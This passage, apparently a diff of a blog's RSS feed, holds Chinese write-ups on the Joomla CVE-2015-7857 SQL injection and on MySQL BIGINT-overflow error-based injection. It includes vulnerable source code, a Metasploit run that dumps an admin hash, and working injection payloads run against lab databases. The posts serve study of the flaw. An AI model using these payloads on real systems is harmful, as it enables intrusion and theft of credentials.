+    &lt;p&gt;&lt;a href=&quot;http://stackoverflow.com/questions/29294286/fata0000-get-http-var-run-docker-sock-v1-17-version-dial-unix-var-run-doc&quot;&gt;FATA[0000] Post http:///var/run/docker.sock/v1.18/images/create?fromImage=kalilinux%2Fkali-linux-docker%3Alatest: dial unix /var/run/docker.sock: no such file or directory. Are you trying to connect to a TLS-enabled daemon without TLS?&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+</description>
 <pubDate>Fri, 13 Nov 2015 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2015/11/13/kali-use-docker.html</link>
 <guid isPermaLink="true">http://localhost:4000/2015/11/13/kali-use-docker.html</guid>
@@ -127,6 +1592,399 @@
 
 <item>
 <title>Joomla 3.2-3.4.4 Sqli CVE-2015-7857 漏洞分析</title>
+<description>&lt;h1 id=&quot;joomla-32-344-sqli-cve-2015-7857-漏洞分析&quot;&gt;Joomla 3.2-3.4.4 Sqli CVE-2015-7857 漏洞分析&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;26 Oct 2015 - Tr3jer_CongRong&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Joomla是一套获得过多个奖项的内容管理系统（Content Management System，CMS），它采用PHP＋MySQL数据库开发，可以运行在Linux、Windows、MacOSX、Solaris等多种平台上。除了具有新闻/文章管理、文档/图片管理、网站布局设置、模板/主题管理等一些基本功能外，还可以通过其提供的上千个插件进行功能扩展。同时它还支持多种语言，由于它的功能非常强大，语言支持强，因此在全世界范围内都有很广泛的应用。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h4&gt;
+&lt;p&gt;      Joomla近日爆出一个由于接收参数过滤不严导致sql注入的漏洞&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7857&quot;&gt;CVE-2015-7857&lt;/a&gt;，通过这个注入漏洞甚至可以得到数据库中任何数据,首先看看漏洞触发组件&lt;code&gt;contenthistory&lt;/code&gt;。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code&gt;/components/com_contenthistory/contenthistory.php&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+defined('_JEXEC') or die;
+
+// Load the com_contenthistory language files, default to the admin file and 	fall back to site if one isn't found
+$lang = JFactory::getLanguage();
+$lang-&amp;gt;load('com_contenthistory', JPATH_ADMINISTRATOR, null, false, true)
+||	$lang-&amp;gt;load('com_contenthistory', JPATH_SITE, null, false, true);
+
+// Hand processing over to the admin base file
+require_once JPATH_COMPONENT_ADMINISTRATOR . '/contenthistory.php';
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      加载了&lt;code&gt;/administrator/components/com_contenthistory/contenthistory.php&lt;/code&gt;这个文件，Joomla管理组件都放在&lt;code&gt;/administrator/components/&lt;/code&gt;目录下，而且所有管理组件都会先检查权限：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;if (!JFactory::getUser()-&amp;gt;authorise('core.manage', 'com_checkin'))
+{
+return JError::raiseWarning(404, JText::_('JERROR_ALERTNOAUTHOR'));
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      可是&lt;code&gt;com_contenthistory&lt;/code&gt;组件在require之前并没有进行此权限检查，再看看加载的这个组件都做了什么。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code&gt;/administrator/components/com_contenthistory/contenthistory.php&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+defined('_JEXEC') or die;
+
+$controller = JControllerLegacy::getInstance('Contenthistory', 	array('base_path' =&amp;gt; JPATH_COMPONENT_ADMINISTRATOR));
+$controller-&amp;gt;execute(JFactory::getApplication()-&amp;gt;input-&amp;gt;get('task'));
+$controller-&amp;gt;redirect();
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      首先调用&lt;code&gt;JControllerLegacy&lt;/code&gt;类并赋值给变量&lt;code&gt;$controller&lt;/code&gt;，随后&lt;code&gt;$controller&lt;/code&gt;调用了控制器&lt;code&gt;execute()&lt;/code&gt;方法。调用的过程传递了&lt;code&gt;JFactory&lt;/code&gt;类的&lt;code&gt;getApplication()&lt;/code&gt;方法，最后调用了&lt;code&gt;display()&lt;/code&gt;控制类，用来实现显示的视图模块。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code&gt;/libraries/legacy/controller/legacy.php&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;public function display($cachable = false, $urlparams = array())
+{
+	$document = JFactory::getDocument();
+	$viewType = $document-&amp;gt;getType();
+	$viewName = $this-&amp;gt;input-&amp;gt;get('view', $this-&amp;gt;default_view);
+	$viewLayout = $this-&amp;gt;input-&amp;gt;get('layout', 'default', 'string');
+
+	$view = $this-&amp;gt;getView($viewName, $viewType, '', array('base_path' =&amp;gt; $this-&amp;gt;basePath, 'layout' =&amp;gt; $viewLayout));
+
+	// Get/Create the model
+	if ($model = $this-&amp;gt;getModel($viewName))
+	{
+		// Push the model into the view (as default)
+		$view-&amp;gt;setModel($model, true);
+	}
+
+	$view-&amp;gt;document = $document;
+
+	$conf = JFactory::getConfig();
+
+	// Display the view
+	if ($cachable &amp;amp;&amp;amp; $viewType != 'feed' &amp;amp;&amp;amp; $conf-&amp;gt;get('caching') &amp;gt;= 1)
+	{
+		$option = $this-&amp;gt;input-&amp;gt;get('option');
+		$cache = JFactory::getCache($option, 'view');
+
+		if (is_array($urlparams))
+		{
+			$app = JFactory::getApplication();
+
+			if (!empty($app-&amp;gt;registeredurlparams))
+			{
+				$registeredurlparams = $app-&amp;gt;registeredurlparams;
+			}
+			else
+			{
+				$registeredurlparams = new stdClass;
+			}
+
+			foreach ($urlparams as $key =&amp;gt; $value)
+			{
+				// Add your safe url parameters with variable type as value {@see JFilterInput::clean()}.
+				$registeredurlparams-&amp;gt;$key = $value;
+			}
+
+			$app-&amp;gt;registeredurlparams = $registeredurlparams;
+		}
+
+		$cache-&amp;gt;get($view, 'display');
+	}
+	else
+	{
+		$view-&amp;gt;display();
+	}
+
+	return $this;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      程序进行到这个方法时会接收&lt;code&gt;view&lt;/code&gt;参数进行显示视图，在第一个if语句快中可以看出请求到模块名时则加载对应的模块，最后&lt;code&gt;$view&lt;/code&gt;调用&lt;code&gt;display()&lt;/code&gt;方法进行视图处理。跟进到&lt;code&gt;administrator&lt;/code&gt;历史模块的数据库操作方法，程序进行到此调用&lt;code&gt;getListQuery()&lt;/code&gt;方法时进行数据提取。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code&gt;/administrator/components/com_contenthistory/models/history.php&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;protected function getListQuery()
+{
+	// Create a new query object.
+	$db = $this-&amp;gt;getDbo();
+	$query = $db-&amp;gt;getQuery(true);
+
+	// Select the required fields from the table.
+	$query-&amp;gt;select(
+		$this-&amp;gt;getState(
+			'list.select',
+			'h.version_id, h.ucm_item_id, h.ucm_type_id, h.version_note, h.save_date, h.editor_user_id,' .
+			'h.character_count, h.sha1_hash, h.version_data, h.keep_forever'
+		)
+	)
+	-&amp;gt;from($db-&amp;gt;quoteName('#__ucm_history') . ' AS h')
+	-&amp;gt;where($db-&amp;gt;quoteName('h.ucm_item_id') . ' = ' . $this-&amp;gt;getState('item_id'))
+	-&amp;gt;where($db-&amp;gt;quoteName('h.ucm_type_id') . ' = ' . $this-&amp;gt;getState('type_id'))
+
+	// Join over the users for the editor
+	-&amp;gt;select('uc.name AS editor')
+	-&amp;gt;join('LEFT', '#__users AS uc ON uc.id = h.editor_user_id');
+
+	// Add the list ordering clause.
+	$orderCol = $this-&amp;gt;state-&amp;gt;get('list.ordering');
+	$orderDirn = $this-&amp;gt;state-&amp;gt;get('list.direction');
+	$query-&amp;gt;order($db-&amp;gt;quoteName($orderCol) . $orderDirn);
+
+	return $query;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      进行数据提取的时候调用了&lt;code&gt;getState()&lt;/code&gt;函数，用于获取请求模型的属性值。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code&gt;/libraries/legacy/model/legacy.php&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;public function getState($property = null, $default = null)
+{
+	if (!$this-&amp;gt;__state_set)
+	{
+		// Protected method to auto-populate the model state.
+		$this-&amp;gt;populateState();
+
+		// Set the model state set flag to true.
+		$this-&amp;gt;__state_set = true;
+	}
+
+	return $property === null ? $this-&amp;gt;state : $this-&amp;gt;state-&amp;gt;get($property, $default);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      随后调用当前类的&lt;code&gt;populateState()&lt;/code&gt;方法，用于过滤请求的参数为指定的数据类型。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code&gt;/administrator/components/com_contenthistory/models/history.php&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;protected function populateState($ordering = null, $direction = null)
+{
+	$input = JFactory::getApplication()-&amp;gt;input;
+	$itemId = $input-&amp;gt;get('item_id', 0, 'integer');
+	$typeId = $input-&amp;gt;get('type_id', 0, 'integer');
+	$typeAlias = $input-&amp;gt;get('type_alias', '', 'string');
+
+	$this-&amp;gt;setState('item_id', $itemId);
+	$this-&amp;gt;setState('type_id', $typeId);
+	$this-&amp;gt;setState('type_alias', $typeAlias);
+	$this-&amp;gt;setState('sha1_hash', $this-&amp;gt;getSha1Hash());
+
+	// Load the parameters.
+	$params = JComponentHelper::getParams('com_contenthistory');
+	$this-&amp;gt;setState('params', $params);
+
+	// List state information.
+	parent::populateState('h.save_date', 'DESC');
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      程序执行到方法末尾时执行了&lt;code&gt;parent::populateState('h.save_date', 'DESC');&lt;/code&gt;也就是调用父类的&lt;code&gt;populateState()&lt;/code&gt;方法，用于过滤接收的&lt;code&gt;list[]&lt;/code&gt;数组。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code&gt;/libraries/legacy/model/list.php&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;protected function populateState($ordering = null, $direction = null)
+{
+	// If the context is set, assume that stateful lists are used.
+	if ($this-&amp;gt;context)
+	{
+		$app = JFactory::getApplication();
+
+		// Receive &amp;amp; set filters
+		if ($filters = $app-&amp;gt;getUserStateFromRequest($this-&amp;gt;context . '.filter', 'filter', array(), 'array'))
+		{
+			foreach ($filters as $name =&amp;gt; $value)
+			{
+				$this-&amp;gt;setState('filter.' . $name, $value);
+			}
+		}
+
+		$limit = 0;
+
+		// Receive &amp;amp; set list options
+		if ($list = $app-&amp;gt;getUserStateFromRequest($this-&amp;gt;context . '.list', 'list', array(), 'array'))
+		{
+			foreach ($list as $name =&amp;gt; $value)
+			{
+				// Extra validations
+				switch ($name)
+				{
+					case 'fullordering':
+						$orderingParts = explode(' ', $value);
+
+						if (count($orderingParts) &amp;gt;= 2)
+						{
+							// Latest part will be considered the direction
+							$fullDirection = end($orderingParts);
+
+							if (in_array(strtoupper($fullDirection), array('ASC', 'DESC', '')))
+							{
+								$this-&amp;gt;setState('list.direction', $fullDirection);
+							}
+
+							unset($orderingParts[count($orderingParts) - 1]);
+
+							// The rest will be the ordering
+							$fullOrdering = implode(' ', $orderingParts);
+
+							if (in_array($fullOrdering, $this-&amp;gt;filter_fields))
+							{
+								$this-&amp;gt;setState('list.ordering', $fullOrdering);
+							}
+						}
+						else
+						{
+							$this-&amp;gt;setState('list.ordering', $ordering);
+							$this-&amp;gt;setState('list.direction', $direction);
+						}
+						break;
+
+					case 'ordering':
+						if (!in_array($value, $this-&amp;gt;filter_fields))
+						{
+							$value = $ordering;
+						}
+						break;
+
+					case 'direction':
+						if (!in_array(strtoupper($value), array('ASC', 'DESC', '')))
+						{
+							$value = $direction;
+						}
+						break;
+
+					case 'limit':
+						$limit = $value;
+						break;
+
+					// Just to keep the default case
+					default:
+						$value = $value;
+						break;
+				}
+
+				$this-&amp;gt;setState('list.' . $name, $value);
+			}
+		}
+		else
+		// Keep B/C for components previous to jform forms for filters
+		{
+			// Pre-fill the limits
+			$limit = $app-&amp;gt;getUserStateFromRequest('global.list.limit', 'limit', $app-&amp;gt;get('list_limit'), 'uint');
+			$this-&amp;gt;setState('list.limit', $limit);
+
+			// Check if the ordering field is in the white list, otherwise use the incoming value.
+			$value = $app-&amp;gt;getUserStateFromRequest($this-&amp;gt;context . '.ordercol', 'filter_order', $ordering);
+
+			if (!in_array($value, $this-&amp;gt;filter_fields))
+			{
+				$value = $ordering;
+				$app-&amp;gt;setUserState($this-&amp;gt;context . '.ordercol', $value);
+			}
+
+			$this-&amp;gt;setState('list.ordering', $value);
+
+			// Check if the ordering direction is valid, otherwise use the incoming value.
+			$value = $app-&amp;gt;getUserStateFromRequest($this-&amp;gt;context . '.orderdirn', 'filter_order_Dir', $direction);
+
+			if (!in_array(strtoupper($value), array('ASC', 'DESC', '')))
+			{
+				$value = $direction;
+				$app-&amp;gt;setUserState($this-&amp;gt;context . '.orderdirn', $value);
+			}
+
+			$this-&amp;gt;setState('list.direction', $value);
+		}
+
+		// Support old ordering field
+		$oldOrdering = $app-&amp;gt;input-&amp;gt;get('filter_order');
+
+		if (!empty($oldOrdering) &amp;amp;&amp;amp; in_array($oldOrdering, $this-&amp;gt;filter_fields))
+		{
+			$this-&amp;gt;setState('list.ordering', $oldOrdering);
+		}
+
+		// Support old direction field
+		$oldDirection = $app-&amp;gt;input-&amp;gt;get('filter_order_Dir');
+
+		if (!empty($oldDirection) &amp;amp;&amp;amp; in_array(strtoupper($oldDirection), array('ASC', 'DESC', '')))
+		{
+			$this-&amp;gt;setState('list.direction', $oldDirection);
+		}
+
+		$value = $app-&amp;gt;getUserStateFromRequest($this-&amp;gt;context . '.limitstart', 'limitstart', 0);
+		$limitstart = ($limit != 0 ? (floor($value / $limit) * $limit) : 0);
+		$this-&amp;gt;setState('list.start', $limitstart);
+	}
+	else
+	{
+		$this-&amp;gt;setState('list.start', 0);
+		$this-&amp;gt;setState('list.limit', 0);
+	}
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      函数使用switch语句判断&lt;code&gt;fullordering&lt;/code&gt;、&lt;code&gt;ordering&lt;/code&gt;、&lt;code&gt;direction&lt;/code&gt;、&lt;code&gt;limit&lt;/code&gt;是否过滤，但是没有验证&lt;code&gt;list[select]&lt;/code&gt;，这时当程序执行到&lt;code&gt;$this-&amp;gt;getState(list.select)&lt;/code&gt;，则导致注入。测试下，访问&lt;code&gt;contenthistory&lt;/code&gt;组件时无限制加载，option=comtenthistory加载历史模块，view=history加载历史视图，list[select]=1满足条件时，则会报错。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/6u5htrdfgx.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      程序执行到&lt;code&gt;populateState()&lt;/code&gt;方法接收参数时确保&lt;code&gt;item_id&lt;/code&gt;、&lt;code&gt;type_id&lt;/code&gt;、&lt;code&gt;list[ordering]&lt;/code&gt;要同时传递，就可以构造payload进行报错注入获得数据，无需获取表前缀，%23_即为joomla表前缀，joomla会自动将#_转换为表前缀，因为joomla的前缀为随机字符串，也可以通过报错获得这个随机字符串。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/54gtersdf.png&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Msf也已经更新了此漏洞的Exploit：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/gather/joomla_contenthistory_sqli
+msf auxiliary(joomla_contenthistory_sqli) &amp;gt; show options
+
+Module options (auxiliary/gather/joomla_contenthistory_sqli):
+Name       Current Setting  Required  Description
+----       ---------------  --------  -----------
+Proxies                     no        A proxy chain of format 	type:host:port[,type:host:port][...]
+RHOST                       yes       The target address
+RPORT      80               yes       The target port
+TARGETURI  /                yes       The relative URI of the Joomla 	instance
+VHOST                       no        HTTP server virtual host
+
+msf auxiliary(joomla_contenthistory_sqli) &amp;gt; set RHOST 127.0.0.1
+RHOST =&amp;gt; 127.0.0.1
+msf auxiliary(joomla_contenthistory_sqli) &amp;gt; set TARGETURI /joomla_3.4.4
+TARGETURI =&amp;gt; /joomla_3.4.4
+msf auxiliary(joomla_contenthistory_sqli) &amp;gt; show options
+	
+Module options (auxiliary/gather/joomla_contenthistory_sqli):
+Name       Current Setting  Required  Description
+----       ---------------  --------  -----------
+Proxies                     no        A proxy chain of format 	type:host:port[,type:host:port][...]
+RHOST      127.0.0.1        yes       The target address
+RPORT      80               yes       The target port
+TARGETURI  /joomla_3.4.4    yes       The relative URI of the Joomla 	instance
+VHOST                       no        HTTP server virtual host
+
+msf auxiliary(joomla_contenthistory_sqli) &amp;gt; run
+
+[+] Saved file to: /Users/CongRong/.msf4/loot/20151026230744_default_127.0.0.1_joomla.users_471318.txt
+[+] Saved file to: /Users/CongRong/.msf4/loot/20151026230917_default_127.0.0.1_joomla.users_140130.txt
+[*] Auxiliary module execution completed
+msf auxiliary(joomla_contenthistory_sqli) &amp;gt; cat .msf4/loot/20151026230744_default_127.0.0.1_joomla.users_471318.txt
+[*] exec: cat .msf4/loot/20151026230744_default_127.0.0.1_joomla.users_471318.txt
+[{&quot;activation&quot;:&quot;&quot;,&quot;block&quot;:&quot;&quot;,&quot;email&quot;:&quot;admin@qq.com&quot;,&quot;id&quot;:&quot;1&quot;,&quot;lastResetTime&quot;:&quot;&quot;,&quot;lastvisitDate&quot;:&quot;&quot;,&quot;name&quot;:&quot;&quot;,&quot;otep&quot;:&quot;&quot;,&quot;otpKey&quot;:&quot;&quot;,&quot;params&quot;:&quot;&quot;,&quot;password&quot;:&quot;d1a1976e385ae56e05524b9517111c75e47c1d23079229c867a7ecc5cd76e8a3&quot;,&quot;registerDate&quot;:&quot;&quot;,&quot;requireReset&quot;:&quot;&quot;,&quot;resetCount&quot;:&quot;&quot;,&quot;sendEmail&quot;:&quot;&quot;,&quot;username&quot;:&quot;admin&quot;}]
+&lt;/code&gt;&lt;/pre&gt;
+</description>
 <pubDate>Mon, 26 Oct 2015 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2015/10/26/joomla-sqli-cve-2015-7857.html</link>
 <guid isPermaLink="true">http://localhost:4000/2015/10/26/joomla-sqli-cve-2015-7857.html</guid>
@@ -134,6 +1992,194 @@
 
 <item>
 <title>BIGINT Overflow Error Based SQL Injection</title>
+<description>&lt;h1 id=&quot;bigint-overflow-error-based-sql-injection&quot;&gt;BIGINT Overflow Error Based SQL Injection&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;10 Aug 2015 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;根据Mysql BIGINT数据类型，结合Mysql两个小特性，巧妙的构造出新型报错注入。Paper翻译自&lt;a target=&quot;_blank&quot; href=&quot;https://www.exploit-db.com/docs/37733.pdf&quot;&gt;BIGINT Overflow Error Based SQL Injection&lt;/a&gt;，这里就分析下此报错注入的方式与原理。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;      &lt;strong&gt;首先看看Mysql(&amp;gt;=5.5.5)如何存储整数的，之前的版本当整数溢出的时候不会报错。&lt;a target=&quot;_blank&quot; href=&quot;http://dev.mysql.com/doc/refman/5.5/en/integer-types.html&quot;&gt;Integer Types (Exact Value)&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/i76ryjtgdh.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      &lt;strong&gt;BIGINT数据类型的长度为8字节(64Bytes)，分别用二进制、十进制、十六进制的&lt;code&gt;signed/unsigned&lt;/code&gt;表示最大值:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#signed - Binary、Decimal、Hex
+0b0111111111111111111111111111111111111111111111111111111111111111
+9223372036854775807
+0x7fffffffffffffff
+
+#unsigned - Binary、Decimal、Hex
+0b1111111111111111111111111111111111111111111111111111111111111111
+18446744073709551615
+0xFFFFFFFFFFFFFFFF
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      &lt;strong&gt;分别将&lt;code&gt;signed/unsigned&lt;/code&gt;的BIGINT最大值进行数学计算，来证明报错的原因：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#signed
+mysql&amp;gt; select cast(x'7fffffffffffffff' as signed)/9223372036854775807;
++---------------------------------------------------------+
+| cast(x'7fffffffffffffff' as signed)/9223372036854775807 |
++---------------------------------------------------------+
+|                                                  1.0000 |
++---------------------------------------------------------+
+1 row in set (0.00 sec)
+mysql&amp;gt; select cast(x'7fffffffffffffff' as signed)+1;
+ERROR 1690 (22003): BIGINT value is out of range in '(cast(0x7fffffffffffffff as signed) + 1)'
+
+#unsigned
+mysql&amp;gt; select 18446744073709551615-1;
++------------------------+
+| 18446744073709551615-1 |
++------------------------+
+|   18446744073709551614 |
++------------------------+
+1 row in set (0.00 sec)
+mysql&amp;gt; select 18446744073709551615+1;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)'
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      &lt;strong&gt;由此看出当BIGINT最大值进行增值运算的时候，&lt;code&gt;signed/unsigned&lt;/code&gt;都会爆出&lt;code&gt;BIGINT value is out of range&lt;/code&gt;的错误，也就是溢出了。还有就是Mysql逐位取反的特性，打个比方：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select ~0;
++----------------------+
+| ~0                   |
++----------------------+
+| 18446744073709551615 |
++----------------------+
+1 row in set (0.00 sec)
+mysql&amp;gt; select ~18446744073709551615;
++-----------------------+
+| ~18446744073709551615 |
++-----------------------+
+|                     0 |
++-----------------------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; select 1-~0;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 - ~(0))'
+
+mysql&amp;gt; select 1+~0;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 + ~(0))'
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      &lt;strong&gt;也就是说从0逐位取反，得到的数字也正是BIGINT中unsigned的数值范围，这个数值进行数学运算时同样会出现溢出错误。那么怎样能在实际应用当中利用上这个报错呢？接下来就说到了Mysql子查询的一个特性，当查询结果成功返回时，返回值为0，表达式进行逻辑非运算后，返回值则为1，并且这个返回值也可以进行数学运算：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select !(select*from(select user())x)+1;
++----------------------------------+
+| !(select*from(select user())x)+1 |
++----------------------------------+
+|                                2 |
++----------------------------------+
+1 row in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      &lt;strong&gt;根据子查询的特点，再结合BIGINT逐位取反的溢出报错。我们就可以进行报错注入了：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select !(select*from(select user())x)-~18446744073709551615;
++------------------------------------------------------+
+| !(select*from(select user())x)-~18446744073709551615 |
++------------------------------------------------------+
+|                                                    1 |
++------------------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; select !(select*from(select user())x)-~0;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))'
+
+mysql&amp;gt; select (select(!x-~0)from(select(select user())x)a);
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'
+
+mysql&amp;gt; select (select!x-~0.from(select(select user())x)a);
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      &lt;strong&gt;既然可以通过BIGINT溢出配合子查询进行报错注入，那么就可以在实战当中获取到更多的数据：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select !(select*from(select concat_ws(':',id, username, password) from k8fzi_users limit 0,1)x)-~0;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '533:admin:$2y$10$wE6S6EEj5Xc3/Jo8rQDSAu0mxQr2FmZJmT4SlsXL8PdM8Ymb/82Ly' from dual))) - ~(0))'
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      &lt;strong&gt;因为是BIGINT数值范围溢出特点，那么Mysql中很多数学函数也可以应用到，Mysql的语法灵活，这些数学函数是可以嵌套表达式的，然后将返回值进行运算。&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;select !hex((select*from(select user())x))-~0;
+select !ceil((select*from(select user())x))-~0;
+select !atan((select*from(select user())x))-~0;
+select !rand((select*from(select user())a))-~0;
+select !sqrt((select*from(select user())a))-~0;
+select !round((select*from(select user())a))-~0;
+select !sign((select*from(select user())a))-~0;
+select !floor((select*from(select user())a))-~0;
+select !tan((select*from(select user())a))-~0;
+select !ceiling((select*from(select user())a))-~0;
+select !exp((select*from(select user())x))-~0;
+select !(select*from(select user())a)-~1^200;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      &lt;strong&gt;既然是报错类型的注入，那么一次性存储也是可以的：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select !(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x2d2d,table_name,0x2d2d,column_name)),@)))x)-~0;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
+joomla_3.4.4--k8fzi_assets--id
+joomla_3.4.4--k8fzi_assets--parent_id
+joomla_3.4.4--k8fzi_assets--lft
+joomla_3.4.4--k8fzi_assets--rgt
+joomla_3.4.4--k8fzi_assets--level
+joomla_3.4.4--k8fzi_assets--name
+joomla_3.4.4--k8fzi_assets--title
+joomla_3.4.4--k8fzi_assets--rules
+joomla_3.4.4--k8fzi_associations--id
+joomla_3.4.4--k8fzi_associations--context
+joomla_3.4.4--k8fzi_associations--key
+joomla_3.4.4--k8fzi_banner_clients--id
+joomla_3.4.4--k8fzi_banner
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      &lt;strong&gt;这里纠正一个Paper中错误的观点，文中提到一次性存储表列数据只能取出27行，其实这是报错信息的最大长度所决定的，如果只想取到重要信息的话，Payload中不加库名表名还有分隔符简短点就可以了，一图胜千言。&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/5u6ehrtsdf.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      &lt;strong&gt;当知道库名表名列名后，就可以构造语句获取数据了：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#select:
+mysql&amp;gt; select !(select*from(select(concat(@:=0,(select count(*)from`dvwa`.users where @:=concat(@,0xa,user_id,0x2d2d,user,0x2d2d,password)),@)))x)-~0;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
+1--admin--5f4dcc3b5aa765d61d8327deb882cf99
+2--gordonb--e99a18c428cb38d5f260853678922e03
+3--1337--8d3533d75ae2c3966d7e0d4fcc69216b
+4--pablo--0d107d09f5bbe40cade3de5c71e9e9b7
+5--smithy--5f4dcc3b5aa765d61d8327deb882cf99' from dual))) - ~(0))'
+
+#insert:
+mysql&amp;gt; insert into users (user_id,user,password) values (2,'' or !(select*from(select(concat(@:=0,(select count(*)from`dvwa`.users where @:=concat(@,0xa,user_id,0x2d2d,user,0x2d2d,password)),@)))x)-~0 or '', 'Eyre');
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
+1--admin--5f4dcc3b5aa765d61d8327deb882cf99
+2--gordonb--e99a18c428cb38d5f260853678922e03
+3--1337--8d3533d75ae2c3966d7e0d4fcc69216b
+4--pablo--0d107d09f5bbe40cade3de5c71e9e9b7
+5--smithy--5f4dcc3b5aa765d61d8327deb882cf99' from dual))) - ~(0))'
+
+#update:
+mysql&amp;gt; update users set password='root' or !(select*from(select(concat(@:=0,(select count(*)from`dvwa`.users where @:=concat(@,0xa,user_id,0x2d2d,user,0x2d2d,password)),@)))x)-~0;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
+1--admin--5f4dcc3b5aa765d61d8327deb882cf99
+2--gordonb--e99a18c428cb38d5f260853678922e03
+3--1337--8d3533d75ae2c3966d7e0d4fcc69216b
+4--pablo--0d107d09f5bbe40cade3de5c71e9e9b7
